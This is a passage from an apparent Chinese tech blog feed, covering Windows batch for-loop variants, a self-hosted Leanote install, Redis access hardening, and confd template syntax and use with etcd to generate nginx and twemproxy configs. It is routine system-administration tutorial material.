在实际的使用中，我更喜欢使用 for /f 和 dir 的组合，因为它不会产生遗漏，并能给我带来更灵活的处理方式，唯一需要忍受的，就是它在处理大量路径时前期的停顿感，以及在这背后稍微有点偏高的内存占 用；在我追求速度且可以忽略带隐藏属性的目录的时候，我会换用 for /r 的方案，不过这样的情形不多——有谁会愿意为了追求速度而容忍遗漏呢？ 仅仅为了匹配第一层目录而存在：for /dfor /d 中 /d ，完整的含义是 /directory，本意是为了处理文件夹，它的完整语句应该是这样的： 1for /d %%i in (元素集合) do 命令语句集合 当“元素集合”中包含有通配符?或*时，它会匹配文件夹，但是，相比 for /r 而言，这个时候的for /d，其作用就小得可怜了：它仅能匹配当前目录下的第一级文件夹，或是指定位置上的文件夹，而不能匹配更深层次的子文件夹。 例如：for /d %%i in (d:\test*) do echo %%i 这样的语句 ，会匹配到形如：d:\test、d:\test1、d:\test2之类的文件夹，若不存在这样的路径，将不会有任何回显。 当“元素集合”中不包含任何的通配符时，它的作用和 “for %%i in (元素集合) do 命令语句集合” 这样的语句别无二致。 因此，for /d 的角色就变得很微妙了：当“元素集合”中包含通配符?或*时，它的作用就是匹配文件夹，此时，它仅能匹配当前目录下的第一级文件夹，或是指定位置上的文件夹，在层次深度上不及 for /r，但和 for /r 一样的坏脾气：不能匹配带隐藏属性的文件夹；在灵活性上不及for /f和dir的组合；当“元素集合”中不包含任何统配符的时候，它完全是 “for %%i in (元素集合) do ……” 语句的翻版，但是又稍显复杂。 for /d 的作用是如此有限，我使用的次数是如此之少，以至于我一度找不到它的用武之地，认为它食之无味，弃之可惜，完全是鸡肋一块。 某年某月，我在cmd窗口里写下了这样的代码：[code24] 1for /d %i in (test*) do @echo %i 我的本意是想查看在我的临时目录下，长年累月的测试工作到底建立了多少测试文件夹，以便我随后把echo换成rd删除之。这个时候，我发现这条代码是如此 的简洁，是 for /r 或 for和 dir /ad /b 的组合所无法替代的（echo换成rd就可以直接删除掉这些测试目录）。 简洁的代码给我带来的喜悦仅仅持续了短短10几秒的时间，我便开始了迷惘——能用到for /d的类似情形，貌似少之又少且乏善可陈啊。 （注：正如qzwqzw所言，for /r /d是可以一起使用的；【在for有限的4个参数中，据我所知只有/r /d可以一起使用】。例如： 123@echo offFor /r /d %%i in (*) do echo %%ipause&gt;nul 效果：显示当前目录下所有的文件夹【包括子文件夹】；等价于 “dir /ad /s /b”。 for /r /d 其实是对 /d 参数的扩展，/d参数本身只能处理第一层文件夹，但是加上/r参数后就可以处理所有的子文件夹； 1234for /r /d依然不能处理隐藏文件夹。这里给出使用for /r /d的一般条件：1.要对文件夹进行操作（dir /ad /s /b可以显示，但不能对文件夹进行操作）；2.不处理隐藏文件夹（说到底，还是for /f 和dir结合的命令更强大些）。 计数循环：for /l/l 者，/loop的缩写是也，从鸟语翻译过来，loop就是循环的意思。实际上，所有的for语句，都可以看成是一种“循环”，只是在/l中，特指按照指定次数进行循环罢了。 for /l 语句的完整格式是这样的： 1for /l %%i in (x,y,z) do (……) 在这个语句中，x、y和z都只能取整数，正负皆可，x指代起始值，y指代步长，z为终止值，具体含义为：从x开始计数，以y为步长，直至最接近 z的那个整数值为止，这之间有多少个数，do后的语句就执行多少次。 举个具体的例子：[code25] 1for /l %%i in (1,2,10) do echo bathome 在以上的代码中，初始值是1，步长为2，终止值为10，表明计数从1开始，每隔2个数计算一次，直至最接近10的那个整数，罗列出来，就是1,3,5,7,9，再下一个就是11，超过10了，不再计算在内，所以，do后的语句只执行5次，将连续显示5个bathome。 实际上，x，y和z的值可正可负，甚至为0，限制非常宽松： 1、步长y的值不能为0； 2、当步长y的值为正整数时，终止值z不能小于初始值x； 3、当步长y的值为负整数的时候，终止值z不能大于初始值x。 换而言之，必须保证in和do之间能取到一个有效的数组序列。 例如：[code26] 1for /l %%i in (-1,2,5) do echo bathome [code27] 1for /l %%i in (5,-2,-1) do echo bathome 以上两条代码的功能完全一样，都将显示4次bathome，区别就在于[code26]是正序计算，而[code27]是逆序计数而已。 以下几条代码都是有问题的：[code28] 1for /l %%i in (1,0,1) do echo bathome [code29] 1for /l %%i in (2,1,1) do echo bathome [code30] 1for /l %%i in (1,-1,2) do echo bathome 其中，[code28]违反了步长不能为0的限制，将陷入无限循环中；[code29]和[code30]都犯了同样的错误：无法获得有效的数列元素，导致in和do之间取到的值为空元素，从而使得整条for语句无从执行。 当大家明白了 for /l 的具体功能之后，是否会想到了与它有异曲同工之妙的goto循环语句呢？似乎，for /l 和 goto 循环语句可以相互替换？ 一般而言，for /l语句可以换成goto循环，但是，goto循环并不一定能被 for /l 语句替换掉。具体原因，请大家仔细想想，我在此不再详细解说，只是就大家非常关心的一个问题提供一个简洁的答案，那就是：什么时候该用 for /l 计数循环，而什么时候又该用goto条件循环？ 答案非常简单：当循环次数确定的时候，首选 for /l 语句，也可使用goto语句但不推荐；当循环次数不确定的时候，用goto语句将是唯一的选择，因为，这个时候需要用if之类的条件语句来判断何时结束goto跳转。]]></content>
      <categories>
        <category>运维研发</category>
        <category>语言积累</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源云笔记:程序员云笔记服务的不二之选]]></title>
    <url>%2Farticles%2Ffbd5898c.html</url>
    <content type="text"><![CDATA[前言在这个互联网知识呈爆炸增长的时代，作为一个程序员要掌握的知识越来越多，然再好的记性也不如烂笔头，有了笔记我们就是可以时常扒拉扒拉以前的知识，顺便可以整理下自己的知识体系。 如今市面上云笔记产品，说实在真不少，什么有道，印象，为知等等，本人目前使用的是有道，无它，免费而已其他几个倒没怎么接触过，毕竟重复的产品一个就够了。笔记用了有三年多时间了，基本都是写写工作日志，备忘一下工作中遇到的脚本命令，顺便记录下工作中遇到的问题，由于只是记录文字，目前10G的空间仅仅使用了冰山一角。 介绍今天，给大家一起分享的是蚂蚁笔记，一个有极客范的云笔记！官方的介绍也相当牛逼：前所未有的文档体验，近乎完美的平台覆盖，支持团队协同，企业级私有云，蚂蚁笔记 = 笔记 + 博客 + 协作 + 私有云。 其实最主要的是蚂蚁笔记开源了，既然如此，云服务器又那么便宜，我们何不自己搭建一个云笔记服务，无论是自己还是分享给同事都是极好的，最主要的是还可以绑定域名生成博客，笔记AND博客一举两得岂不乐哉。 当然，如果有些小伙伴对信息安全要求较高的，不希望自己的信息记录在别人的服务器上，对开源源码有一定研究，使用起来还是不错的。但是如果单纯是为了省钱就没必要了，即使收费的有道一天也就几毛钱而已，而云服务器费用，自身是否有技术支持也是以后使用的硬伤，下面开始如何安装使用教程。 安装提前预警，本次安装涉及到阿里云ECS、Centos7、Mongodb，Leanote、Golang、OpenResty、wkhtmltopdf、企业邮箱相关软件的安装配置。 mongodb蚂蚁笔记数据库采用的是mongodb，需提前安装。 Yum源一键安装 1yum -y install mongodb-server mongodb 启动 1mongo 由于ECS安全组并没有开放mongodb相关端口，仅内网使用，这里就没有配置相关鉴权访问。 leanote安装 Leanote 有两种方式：二进制版是编译好的 Leanote， 不用安装开发环境，Leanote 源码安装, 需要安装编译环境 Golang，为了方便期间，这里我们选择二进制版安装。 各版本下载地址：http://leanote.org/#download 选择Linux下64位最新版本下载 1wget https://superb-sea2.dl.sourceforge.net/project/leanote-bin/2.5/leanote-linux-amd64-v2.5.bin.tar.gz 解压 1tar -xvf leanote-linux-amd64-v2.5.bin.tar.gz 导入数据库 12cd leanotemongorestore -h localhost -d leanote --dir mongodb_backup/leanote_install_data/ OpenResty升级版Nginx，推荐大家使用，此处的目的是绑定域名，转发leanote服务。 Yum安装相关依赖组件 1yum install readline-devel pcre-devel openssl-devel -y 下载最新版本： 1wget https://openresty.org/download/openresty-1.11.2.4.tar.gz 解压并重命名： 12tar -xvf openresty-1.11.2.4.tar.gzmv openresty-1.11.2.4 openresty 安装配置： 1./configure 您可以使用下面的命令来编译安装： 1make &amp;&amp; make install 如果您的电脑支持多核 make 工作的特性, 您可以这样编译安装: 1make &amp;&amp; make install -j2 为了方便启动，建立软连接： 1ln -s /usr/local/openresty/nginx/sbin/nginx /usr/sbin/nginx 配置文件 12345678910vi /usr/local/openresty/nginx/conf/nginx.confserver &#123; listen 80; server_name notes.52itstyle.com; charset utf-8; location / &#123; default_type text/html; proxy_pass http://127.0.0.1:9000; &#125;&#125; wkhtmltopdfwkhtmltopdf主要用于导出PDF版笔记。 各版本下载地址：https://wkhtmltopdf.org/downloads.html 下载 1wget https://github.com/wkhtmltopdf/wkhtmltopdf/releases/download/0.12.4/wkhtmltox-0.12.4_linux-generic-amd64.tar.xz 解压 1tar -xvf wkhtmltox-0.12.4_linux-generic-amd64.tar.xz 移动文件 123cd wkhtmltopdf/binchmod +x wkhtmltopdfmv wkhtmltopdf /usr/local/bin 测试是否安装成功 12cd /usr/local/binwkhtmltopdf http://notes.52itstyle.com /home/52itstyle.pdf 导出的PDF中文会乱码，我们需要找到windows里C:\Windows\Fonts文件夹中的宋体或者微软雅黑字体，上传到服务器/usr/share/fonts/目录下即可。 启动服务启动 Leanote123cd leanote/binchmod +x run.sh./run.sh &amp; 如果最后出现 Listening on :9000 … 说明启动成功 启动 Nginx1nginx 访问服务：http://notes.52itstyle.com/ ，出现以下界面，说明配置成功。 使用配置Leanote默认账号为amdin，密码是abc123。登陆成功后首先进入后台管理，配置Site’s URL为自己的域名 同时修改leanote/conf/app.conf相关参数site.url 为http://notes.52itstyle.com， 不然每次重启要重新界面设置。 配置电子邮件发送，用于登录、注册、留言、找回密码、邀请注册等操作 配置wkhtmltopdf执行命令路径 进入个人中心，配置密码以及博客设置 笔记相关界面操作 APP访问Leanote的客户端做的也是相当贴心和完善了, 在登录界面最底部点击使用自定义服务器。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis安全机制设置]]></title>
    <url>%2Farticles%2F3f430996.html</url>
    <content type="text"><![CDATA[背景redis作为一个高速数据库，在互联网上广泛使用，但是在生产环境必须有对应的安全机制来进行保护。那么怎么保护呢？ 方法一：采用绑定IP的方式来进行控制。 请在redis.conf文件找到如下配置 1234# If you want you can bind a single interface, if the bind option is not# specified all the interfaces will listen for incoming connections.## bind 127.0.0.1 把# bind 127.0.0.1前面的 注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问 这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。 方法二：设置密码，以提供远程登陆打开redis.conf配置文件，找到requirepass，然后修改如下: 12requirepass yourpassword# yourpassword就是redis验证密码，*设置密码以后发现可以登陆，但是无法执行命令了。 命令如下: 12redis-cli -h yourIp -p yourPort//启动redis客户端，并连接服务器keys * //输出服务器中的所有key 报错如下(error) ERR operation not permitted 这时候你可以用授权命令进行授权，就不报错了 命令如下: 1auth youpassword 另外，在连接服务器的时候就可以指定登录密码，避免单独输入上面授权命令 命令如下: 1redis-cli -h yourIp-p yourPort -a youPassword 除了在配置文件redis.conf中配置验证密码以外，也可以在已经启动的redis服务器通过命令行设置密码，但这种方式是临时的，当服务器重启了密码必须重设。命令行设置密码方式如下： 1config set requirepass yourPassword 有时候我们不知道当前redis服务器是否有设置验证密码，或者忘记了密码是什么，我们可以通过命令行输入命令查看密码，命令如下： 1config get requirepass 如果redis服务端没有配置密码，会得到nil，而如果配置了密码，但是redis客户端连接redis服务端时，没有用密码登录验证，会提示：operation not permitted,这时候可以用命令：auth yourpassword 进行验证密码，再执行 config set requirepass，就会显示yourpassword 由于redis并发能力极强，仅仅搞密码，攻击者可能在短期内发送大量猜密码的请求，很容易暴力破解，所以建议密码越长越好，比如20位。（密码在 conf文件里是明文，所以不用担心自己会忘记）]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[confd模板语法详解]]></title>
    <url>%2Farticles%2F9d4187fa.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了confd模板的语法和结构。并且在结尾给出示例演示，帮助你充分理解好消化。 模板源模板源以TOML编写并已 .toml 作为后缀的来定义的。默认情况下，模板源存储在/etc/confd/conf.d 目录下。 必要参数 dest （字符串） - 目标文件。 keys （字符串数组） - 键数组。 src （字符串） - 配置模板的相对路径 。 可选参数 gid （int） - 应该拥有该文件的gid。默认为有效的gid。 mode （字符串） - 文件的权限模式。 uid （int） - 应该拥有该文件的uid。默认为有效的uid。 reload_cmd （字符串） - 重新加载配置的命令。 check_cmd （字符串）- 检查配置的命令。 prefix （字符串） - 键前缀的字符串。 注意点使用该 reload_cmd 功能时，命令自行退出非常重要。reload命令不由confd管理，并将阻止配置运行直到它退出。 例子1234567891011[template]src = "nginx.conf.tmpl"dest = "/etc/nginx/nginx.conf"uid = 0gid = 0mode = "0644"keys = [ "/nginx",]check_cmd = "/usr/sbin/nginx -t -c &#123;&#123;.src&#125;&#125;"reload_cmd = "/usr/sbin/service nginx restart" 模板定义单个应用程序配置模板。默认情况下，模板存储在/etc/confd/templates 目录下。 模板是用Go编写的 模板格式。 模板函数map创建接口和字符串的键值映射 12345&#123;&#123;$endpoint := map "name" "elasticsearch" "private_port" 9200 "public_port" 443&#125;&#125;name: &#123;&#123;index $endpoint "name"&#125;&#125;private-port: &#123;&#123;index $endpoint "private_port"&#125;&#125;public-port: &#123;&#123;index $endpoint "public_port"&#125;&#125; 如果您是子模板并且想要向其传递多个值，则特别有用。 basepath.Base函数的别名 。 1234&#123;&#123;with get "/key"&#125;&#125; key: &#123;&#123;base .Key&#125;&#125; value: &#123;&#123;.Value&#125;&#125;&#123;&#123;end&#125;&#125; exists判断键是否存在。如果找不到键，则返回false。 123&#123;&#123;if exists "/key"&#125;&#125; value: &#123;&#123;getv "/key"&#125;&#125;&#123;&#123;end&#125;&#125; get返回键与其键匹配的键值对。如果未找到键，则返回错误。 1234&#123;&#123;with get "/key"&#125;&#125; key: &#123;&#123;.Key&#125;&#125; value: &#123;&#123;.Value&#125;&#125;&#123;&#123;end&#125;&#125; gets返回与其key匹配所有键值对，如果未找到键，则返回错误。 1234&#123;&#123;range gets "/*"&#125;&#125; key: &#123;&#123;.Key&#125;&#125; value: &#123;&#123;.Value&#125;&#125;&#123;&#123;end&#125;&#125; getv返回与其键或可选的默认值匹配的字符串，如果未找到键且未给出默认值，则返回错误。 1value: &#123;&#123;getv "/key"&#125;&#125; getv默认值1value: &#123;&#123;getv "/key" "default_value"&#125;&#125; getvs返回与其键匹配所有值的字符串，如果未找到密钥，则返回错误。 123&#123;&#123;range getvs "/*"&#125;&#125; value: &#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125; getenv返回在os.Getenv 中检索由键命名的环境变量的值。如果变量不存在，该值将为空。（可选）您可以提供一个默认值，如果该键不存在，将返回该值。 12export HOSTNAME=`hostname`hostname: &#123;&#123;getenv &quot;HOSTNAME&quot;&#125;&#125; getenv默认值1ipaddr: &#123;&#123;getenv &quot;HOST_IP&quot; &quot;127.0.0.1&quot;&#125;&#125; datetime是time.Now的别名 123Generated by confd &#123;&#123;datetime&#125;&#125;输出：Generated by confd 2015-01-23 13:34:56.093250283 -0800 PST 123Generated by confd &#123;&#123;datetime.Format "Jan 2, 2006 at 3:04pm (MST)"&#125;&#125;输出：Generated by confd Jan 23, 2015 at 1:34pm (EST) 更多用法，请参阅官方时间用法。 split包装器 strings.Split。分隔输入的字符串并返回一个子字符串切片。 123&#123;&#123; $url := split (getv "/deis/service") ":" &#125;&#125; host: &#123;&#123;index $url 0&#125;&#125; port: &#123;&#123;index $url 1&#125;&#125; toUpperstrings.ToUpper的 别名 返回大写字符串。 1key: &#123;&#123;toUpper "value"&#125;&#125; toLowerstrings.ToLower的 别名 。返回小写字符串。 1key: &#123;&#123;toLower "Value"&#125;&#125; json返回map[string]interface{}形式的json值。 lookupSRVnet.LookupSRV 包装器 。通过组合net.SRV结构的所有字段按字母顺序对SRV记录进行排序，以减少不必要的配置重新加载。 123456&#123;&#123;range lookupSRV "mail" "tcp" "example.com"&#125;&#125; target: &#123;&#123;.Target&#125;&#125; port: &#123;&#123;.Port&#125;&#125; priority: &#123;&#123;.Priority&#125;&#125; weight: &#123;&#123;.Weight&#125;&#125;&#123;&#123;end&#125;&#125; etcd添加键值12etcdctl set /services/zookeeper/host1 '&#123;"Id":"host1", "IP":"192.168.10.11"&#125;'etcdctl set /services/zookeeper/host2 '&#123;"Id":"host2", "IP":"192.168.10.12"&#125;' 创建模板源123456[template]src = "services.conf.tmpl"dest = "/tmp/services.conf"keys = [ "/services/zookeeper/"] 创建模板12345&#123;&#123;range gets "/services/zookeeper/*"&#125;&#125;&#123;&#123;$data := json .Value&#125;&#125; id: &#123;&#123;$data.Id&#125;&#125; ip: &#123;&#123;$data.IP&#125;&#125;&#123;&#123;end&#125;&#125; map遍历一旦解析了JSON，就可以使用普通的Go模板函数遍历它 index。 更高级的结构，如下所示： 123456&#123; "animals": [ &#123;"type": "dog", "name": "Fido"&#125;, &#123;"type": "cat", "name": "Misse"&#125; ]&#125; 它可以像这样遍历： 123456&#123;&#123;$data := json (getv "/test/data/")&#125;&#125;type: &#123;&#123; (index $data.animals 1).type &#125;&#125;name: &#123;&#123; (index $data.animals 1).name &#125;&#125;&#123;&#123;range $data.animals&#125;&#125;&#123;&#123;.name&#125;&#125;&#123;&#123;end&#125;&#125; jsonArray从接口返回json数组，例如： [“a”, “b”, “c”]`。 123&#123;&#123;range jsonArray (getv "/services/data/")&#125;&#125; val: &#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125; ls返回匹配路径的所有子键，字符串等。如果找不到路径，则返回空列表。 123&#123;&#123;range ls "/deis/services"&#125;&#125; value: &#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125; lsdir返回匹配路径的所有子键，字符串等。注意它只返回也有子键的子键。如果找不到路径，则返回空列表。 123&#123;&#123;range lsdir "/deis/services"&#125;&#125; value: &#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125; dir返回制定键的父目录。 123&#123;&#123;with dir "/services/data/url"&#125;&#125; dir: &#123;&#123;.&#125;&#125;&#123;&#123;end&#125;&#125; joinstrings.Join 函数的别名 。 12&#123;&#123;$services := getvs "/services/elasticsearch/*"&#125;&#125;services: &#123;&#123;join $services ","&#125;&#125; replacestrings.place 函数的别名 。 12&#123;&#123;$backend := getv "/services/backend/nginx"&#125;&#125;backend = &#123;&#123;replace $backend "-" "_" -1&#125;&#125; lookupIPnet.LookupIP 函数的包装器 。包装器还按字母顺序排序IP地址。这一点至关重要，因为在动态环境中，DNS服务器通常会混淆链接到域名的地址。这将导致不必要的配置重新加载。 123&#123;&#123;range lookupIP "some.host.local"&#125;&#125; server &#123;&#123;.&#125;&#125;;&#123;&#123;end&#125;&#125; 用法简单实例1234567891011121314151617181920212223242526272829303132etcdctl set /nginx/domain 'example.com'etcdctl set /nginx/root '/var/www/example_dotcom'etcdctl set /nginx/worker_processes '2'etcdctl set /app/upstream/app1 "10.0.1.100:80"etcdctl set /app/upstream/app2 "10.0.1.101:80"cat /etc/confd/templates/nginx.conf.tmpl worker_processes &#123;&#123;getv "/nginx/worker_processes"&#125;&#125;; upstream app &#123; &#123;&#123;range getvs "/app/upstream/*"&#125;&#125; server &#123;&#123;.&#125;&#125;; &#123;&#123;end&#125;&#125; &#125; server &#123; listen 80; server_name www.&#123;&#123;getv "/nginx/domain"&#125;&#125;; access_log /var/log/nginx/&#123;&#123;getv "/nginx/domain"&#125;&#125;.access.log; error_log /var/log/nginx/&#123;&#123;getv "/nginx/domain"&#125;&#125;.log; location / &#123; root &#123;&#123;getv "/nginx/root"&#125;&#125;; index index.html index.htm; proxy_pass http://app; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 输出： /etc/nginx/nginx.conf 1234567891011121314151617181920212223worker_processes 2;upstream app &#123; server 10.0.1.100:80; server 10.0.1.101:80;&#125;server &#123; listen 80; server_name www.example.com; access_log /var/log/nginx/example.com.access.log; error_log /var/log/nginx/example.com.error.log; location / &#123; root /var/www/example_dotcom; index index.html index.htm; proxy_pass http://app; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 复杂的例子此示例显示如何使用模板函数的组合来执行嵌套迭代。 到etcd添加键123456etcdctl mkdir /services/web/cust1/etcdctl mkdir /services/web/cust2/etcdctl set /services/web/cust1/2 '&#123;"IP": "10.0.0.2"&#125;'etcdctl set /services/web/cust2/2 '&#123;"IP": "10.0.0.4"&#125;'etcdctl set /services/web/cust2/1 '&#123;"IP": "10.0.0.3"&#125;'etcdctl set /services/web/cust1/1 '&#123;"IP": "10.0.0.1"&#125;' 创建模板源123456[template]src = "services.conf.tmpl"dest = "/tmp/services.conf"keys = [ "/services/web"] 创建模板1234567891011121314&#123;&#123;range $dir := lsdir "/services/web"&#125;&#125;upstream &#123;&#123;base $dir&#125;&#125; &#123; &#123;&#123;$custdir := printf "/services/web/%s/*" $dir&#125;&#125;&#123;&#123;range gets $custdir&#125;&#125; server &#123;&#123;$data := json .Value&#125;&#125;&#123;&#123;$data.IP&#125;&#125;:80; &#123;&#123;end&#125;&#125;&#125;server &#123; server_name &#123;&#123;base $dir&#125;&#125;.example.com; location / &#123; proxy_pass &#123;&#123;base $dir&#125;&#125;; &#125;&#125;&#123;&#123;end&#125;&#125; 输出：/tmp/services.conf 1234567891011121314151617181920212223upstream cust1 &#123; server 10.0.0.1:80; server 10.0.0.2:80;&#125;server &#123; server_name cust1.example.com; location / &#123; proxy_pass cust1; &#125;&#125;upstream cust2 &#123; server 10.0.0.3:80; server 10.0.0.4:80;&#125;server &#123; server_name cust2.example.com; location / &#123; proxy_pass cust2; &#125;&#125;]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Confd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[confd配置管理工具详解]]></title>
    <url>%2Farticles%2F8013785a.html</url>
    <content type="text"><![CDATA[概述当系统变的复杂，配置项越来越多，一方面配置管理变得繁琐，另一方面配置修改后需要重新上线同样十分痛苦。这时候，需要有一套集中化配置管理系统，一方面提供统一的配置管理，另一方面提供配置变更的自动下发，及时生效。提到统一配置管理系统，大家应该比较熟悉，常见的：zookeeper、etcd、consul、git等等。上述的集中配置中心使用的时候，部署图大致是这样的： server端只需要调用config-server对应客户端获取配置，和监听配置变更就可以了。总体来说没有太大难度。 接下来要说一下confd，它提供了一种新的集成思路。confd的存在有点类似于快递员，买了东西不需要自己到店去取货了，confd这个快递员会把货取过来，然后送到家里，并且通知你货已经送到了。加入confd之后的架构大致是这样的： confd工作原理confd使用时有几个概念需要熟悉，并且熟悉他们之间的依赖关系，才能理解如何配置confd，不然会比较懵。这里我们先看一下confd配置的几个概念之间是如何交互的： confd的部署以Linux系统为例。官方下载地址 123456789# 下载二进制文件wget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64# 重命名二进制文件，并移动到PATH的目录下mv confd-0.16.0-linux-amd64 /usr/local/bin/confdchmod +x /usr/local/bin/confd# 验证是否安装成功confd --help confd的配置详情参考：confd模板语法详解 Confd通过读取后端存储的配置信息来动态更新对应的配置文件，对应的后端存储可以是etcd，redis等，其中etcd的v3版本对应的存储后端为etcdv3。 创建confdirconfdir底下包含两个目录: conf.d: confd的配置文件，主要包含配置的生成逻辑，例如模板源，后端存储对应的keys，命令执行等。 templates: 配置模板Template，即基于不同组件的配置，修改为符合 Golang text templates的模板文件。 1mkdir -p /etc/confd/&#123;conf.d,templates&#125; 模板源模板源配置文件是TOML格式的文件，主要包含配置的生成逻辑，例如模板源，后端存储对应的keys，命令执行等。默认目录在/etc/confd/conf.d。 必要参数 dest （字符串） - 目标文件。 keys （字符串数组） - 键数组。 src （字符串） - 配置模板的相对路径 。 可选参数 gid （int） - 应该拥有该文件的gid。默认为有效的gid。 mode （字符串） - 文件的权限模式。 uid （int） - 应该拥有该文件的uid。默认为有效的uid。 reload_cmd （字符串） - 重新加载配置的命令。 check_cmd （字符串） - 检查配置的命令。 prefix （字符串） - 键前缀的字符串。 例子 12345678910111213cat /etc/confd/conf.d/myapp-nginx.toml[template]prefix = "/myapp"src = "nginx.tmpl"dest = "/tmp/myapp.conf"owner = "nginx"mode = "0644"keys = [ "/services/web"]check_cmd = "/usr/sbin/nginx -t -c &#123;&#123;.src&#125;&#125;"reload_cmd = "/usr/sbin/service nginx reload" 模板Template定义了单一应用配置的模板，默认存储在/etc/confd/templates目录下，模板文件符合Go的text/template格式。 模板文件常用函数有base，get，gets，lsdir，json等。具体可参考https://github.com/kelseyhightower/confd/blob/master/docs/templates.md。 例子： 12345678910111213141516cat /etc/confd/templates/nginx.tmpl&#123;&#123;range $dir := lsdir "/services/web"&#125;&#125;upstream &#123;&#123;base $dir&#125;&#125; &#123; &#123;&#123;$custdir := printf "/services/web/%s/*" $dir&#125;&#125;&#123;&#123;range gets $custdir&#125;&#125; server &#123;&#123;$data := json .Value&#125;&#125;&#123;&#123;$data.IP&#125;&#125;:80; &#123;&#123;end&#125;&#125;&#125;server &#123; server_name &#123;&#123;base $dir&#125;&#125;.example.com; location / &#123; proxy_pass &#123;&#123;base $dir&#125;&#125;; &#125;&#125;&#123;&#123;end&#125;&#125; 创建后端存储的配置数据以etcdv3存储为例，在etcd中创建以下数据. 1234etcdctl --endpoints=$endpoints put /services/web/cust1/2 '&#123;"IP": "10.0.0.2"&#125;'etcdctl --endpoints=$endpoints put /services/web/cust2/2 '&#123;"IP": "10.0.0.4"&#125;'etcdctl --endpoints=$endpoints put /services/web/cust2/1 '&#123;"IP": "10.0.0.3"&#125;'etcdctl --endpoints=$endpoints put /services/web/cust1/1 '&#123;"IP": "10.0.0.1"&#125;' 启动confd的服务confd支持以daemon或者onetime两种模式运行，当以daemon模式运行时，confd会监听后端存储的配置变化，并根据配置模板动态生成目标配置文件。 如果以daemon模式运行，则执行以下命令： 1confd -watch -backend etcdv3 -node http://172.16.5.4:12379 &amp; 以下以onetime模式运行为例。其中对应的后端存储类型是etcdv3。 12345678910# 执行命令confd -onetime -backend etcdv3 -node http://172.16.5.4:12379# output2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Backend set to etcdv32018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Starting confd2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Backend source(s) set to http://172.16.5.4:123792018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO /root/myapp/twemproxy/conf/twemproxy.conf has md5sum 6f0f43abede612c75cb840a4840fbea3 should be 32f48664266e3fd6b56ee73a314ee2722018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Target config /root/myapp/twemproxy/conf/twemproxy.conf out of sync2018-05-11T18:04:59+08:00 k8s-dbg-master-1 confd[35808]: INFO Target config /root/myapp/twemproxy/conf/twemproxy.conf has been updated 查看生成的配置文件在/etc/confd/conf.d/myapp-nginx.toml中定义的配置文件的生成路径为/tmp/myapp.conf。 12345678910111213141516171819202122232425cat myapp.conf upstream cust1 &#123; server 10.0.0.1:80; server 10.0.0.2:80; &#125; server &#123; server_name cust1.example.com; location / &#123; proxy_pass cust1; &#125; &#125; upstream cust2 &#123; server 10.0.0.3:80; server 10.0.0.4:80; &#125; server &#123; server_name cust2.example.com; location / &#123; proxy_pass cust2; &#125; &#125; confd动态更新twemproxytwemproxy.tomlconfd的模板源文件配置：/etc/confd/conf.d/twemproxy.toml 12345678[template]src = "twemproxy.tmpl"dest = "/root/myapp/twemproxy/conf/twemproxy.conf"keys = [ "/twemproxy/pool"]check_cmd = "/usr/local/bin/nutcracker -t -c /root/myapp/twemproxy/conf/twemproxy.conf"reload_cmd = "bash /root/myapp/twemproxy/reload.sh" twemproxy.tmpl模板文件：/etc/confd/templates/twemproxy.tmpl 123456789101112131415161718192021222324global: worker_processes: 4 # 并发进程数, 如果为0, 这 fallback 回原来的单进程模型(不支持 config reload!) user: nobody # worker 进程的用户, 默认 nobody. 只要主进程是 root 用户启动才生效. group: nobody # worker 进程的用户组 worker_shutdown_timeout: 30 # 单位为秒. 用于 reload 过程中在改时间段之后强制退出旧的 worker 进程.pools: &#123;&#123;range gets "/twemproxy/pool/*"&#125;&#125; &#123;&#123;base .Key&#125;&#125;: &#123;&#123;$pool := json .Value&#125;&#125; listen: &#123;&#123;$pool.ListenAddr.IP&#125;&#125;:&#123;&#123;$pool.ListenAddr.Port&#125;&#125; hash: fnv1a_64 # 选择实例的 hash 规则 distribution: ketama auto_eject_hosts: true # server 有问题是否剔除 redis: true # 是否为 Redis 协议 &#123;&#123;if $pool.Password&#125;&#125;redis_auth: &#123;&#123;$pool.Password&#125;&#125;&#123;&#123;end&#125;&#125; server_retry_timeout: 5000 # 被剔除多长时间后会重试 server_connections: 25 # NOTE: server 连接池的大小, 默认为 1, 建议调整 server_failure_limit: 5 # 失败多少次后暂时剔除 timeout: 1000 # Server 超时时间, 1 sec backlog: 1024 # 连接队列大小 preconnect: true # 预连接大小 servers:&#123;&#123;range $server := $pool.Servers&#125;&#125; - &#123;&#123;$server.IP&#125;&#125;:&#123;&#123;$server.Port&#125;&#125;:1 &#123;&#123;if $server.Master&#125;&#125;master&#123;&#123;end&#125;&#125; &#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125; 